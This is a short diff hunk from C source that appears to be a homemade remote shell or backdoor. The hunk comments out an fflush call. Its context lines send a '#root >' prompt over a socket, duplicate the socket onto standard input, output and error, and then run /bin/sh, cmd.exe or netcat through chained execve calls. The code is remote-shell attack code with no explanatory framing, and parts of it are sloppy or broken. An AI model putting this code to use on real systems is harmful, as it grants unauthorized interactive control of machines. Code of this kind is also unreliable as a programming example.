@@ -213,7 +213,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      else 
 	     
      send(x,"\n#root > /n",7,0);
-     fflush(stdout);
+     /*fflush(stdout);*/
      
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
      root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);
